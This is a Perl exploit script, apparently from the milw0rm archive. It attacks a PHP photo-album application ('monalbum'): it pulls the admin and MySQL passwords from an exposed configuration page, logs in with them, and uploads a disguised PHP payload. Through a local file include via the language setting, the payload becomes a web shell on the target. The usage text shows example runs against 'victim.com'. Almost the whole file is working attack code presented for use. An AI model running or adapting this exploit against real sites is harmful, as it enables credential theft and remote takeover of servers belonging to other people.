#!/usr/bin/env perl
use strict; use warnings;
###############################################
use LWP::UserAgent;
use HTTP::Request::Common;
use Getopt::Std;

my (%args, $user, $password, $sql_host, $sql_user, $sql_password, $cookie, $path, $file, $upload)  = ();
my $tmp = 'cmd1.jpg';

getopts("u:a:f:p:", \%args);
#######################################################################
# -a don't retrieve login and passwords, use from command line instead#
# -u vuln url                                                         #
# -f local php-shell                                                  #
# -p http proxy                                                       #
#######################################################################

if(!$args{u}) { &usage(); exit(0);}

if(defined $args{a}){
	($user,$password) = split(':',$args{a});
}

if(!$args{a}){
	my $ua= new LWP::UserAgent;
	$ua->agent("Mozilla/5.0");
	if(defined $args{p}){$ua->proxy('http', "http://$args{p}");}
	$ua->max_redirect(0);
	$args{u} =~ s%/$%%i;
	my $request = new HTTP::Request( 'GET' => "$args{u}"."/admin/admin_configuration.php");
	my $document = $ua->request($request);
	my $response = $document->as_string;
	$response =~ m%<input type="text" name="gadm_user" value="(.*?)">%is;
	$user = $1;
	$response =~ m%<input type="password" name="gadm_pass" value="(.*?)">%is;
	$password = $1;
	$response =~ m%<input type="text" name="gcfgHote" value="(.*?)">%is;
	$sql_host = $1;
	$response =~ m%<input type="text" name="gcfgUser" value="(.*?)">%is;
	$sql_user = $1;
	$response =~ m%<input type="password" name="gcfgPass" value="(.*?)">%is;
	$sql_password = $1;
	print("########################################################################\n");
	if(defined $user && defined $password){
		print "#Admin Panel: $user\t$password                                         \n";
		print("########################################################################\n");
		print "#Mysql Details: $sql_host\t$sql_user\t$sql_password                    \n";
	}else{
		print "#Failed...                                                             #\n";
		exit(0);
	}
}

goto _EXIT_ unless defined $args{f};

my $ua= new LWP::UserAgent;
$ua->agent("Mozilla/5.0");
if(defined $args{p}){$ua->proxy('http', "http://$args{p}");}
$args{u} =~ s%/$%%i;
my $request = HTTP::Request::Common::POST(
		"$args{u}/admin/login_page.php",
		Content_Type => 'application/x-www-form-urlencoded',
		Referer => "$args{u}/admin/login_page.php",
		Content => [
			login_adm => "$user",
			pass_adm => "$password",
			send => "Enter"
		]
	);
my $document = $ua->request($request);
my $response = $document->as_string;
if($response =~ m/document\.location\.replace\(\'\.\.\/admin\.php\'\)/i){
	print("########################################################################\n");
	print "#Login successfull                                                     #\n";
	$response =~ m%Set-Cookie: (.*?);%is;
	$cookie = $1;
}else{
	print("########################################################################\n");
	print "#Login failed                                                          #\n";
	goto _EXIT_;
}

$ua->default_headers->push_header('Cookie' => "$cookie");
$request = new HTTP::Request( 'GET' => "$args{u}"."/admin/admin_ajouter_img.php");
$document = $ua->request($request);
$response = $document->as_string;
$response =~ m%<form ENCTYPE='multipart/form-data'  method='post' action=(.*?)>%i;
$upload = $1;

$request = HTTP::Request::Common::POST(
	"$args{u}/admin/$upload",
	Content_Type => 'multipart/form-data',
	Referer => "$args{u}/admin/admin_ajouter_img.php",
	Content => [
		MAX_FILE_SIZE => "1000000",
		userfile => [$args{f}],
		Content_Type => "image/jpeg"
	]
);

$document = $ua->request($request);
$response = $document->as_string;
#print $response;

$response =~ m%is not a valid JPEG file in <b>(.*?)<\/b>%i;
#/var/www/web70/html/monalbum/admin/admin_ajouter_img.php
#print $1;
$path = $1;
$path =~ s%/admin/admin_ajouter_img\.php%%i;
$path .= "/images";
#print $path;

$args{f} =~ m/([\w\.\-]+)$/i;
$file = $1;

open TEMP,">$tmp" || die "Can't open $tmp: $!\n";
print TEMP "<?php system(\"mv $path/$file $path/$file.php\"); die(); ?>";
close(TEMP);

$request = HTTP::Request::Common::POST(
	"$args{u}/admin/$upload",
	Content_Type => 'multipart/form-data',
	Referer => "$args{u}/admin/admin_ajouter_img.php",
	Content => [
		MAX_FILE_SIZE => "1000000",
		userfile => [$tmp],
		Content_Type => "image/jpeg"
	]
);

$document = $ua->request($request);
$request = HTTP::Request::Common::POST(
	"$args{u}/admin/admin_configuration.php",
	Content_Type => 'multipart/form-data',
	Referer => "$args{u}/admin/admin_configuration.php",
	Content => [
		glangage => "../images/$tmp",
		Save => "Save"
	]
);
$document = $ua->request($request);
$ua->max_redirect(0);
$request = new HTTP::Request( 'HEAD' => "$args{u}/images/$file.php");
$document = $ua->request($request);


if($document->is_success){
	print("########################################################################\n");
	print "#Shell Uploaded Successfull!                                           #\n";
	print "#U may now try: $args{u}/images/$file.php                              \n";
}else{
	print("########################################################################\n");
	print "#Something went wrong!!!                                               #\n";
	}

_EXIT_:
unlink($tmp);
print("########################################################################\n");
exit(0);

sub usage
{
print("###########################################################################
# -a using account from command line                                      #
# -u vuln url                                                             #
# -f local php-shell  (optional)                                          #
# -p http proxy       (optional)                                          #
###########################################################################
# : perl sp.pl -u http://victim.com/monalbum/ -p 75.34.123.215:9629       #
# : perl sp.pl -u http://victim.com/monalbum/ -f shell.jpg                #
# : perl sp.pl -u http://victim.com/monalbum/ -a admin:admin -f shell.jpg #
# this lame script was coded by v0l4arrra                                 #
###########################################################################
"
);
}

# milw0rm.com [2007-12-10]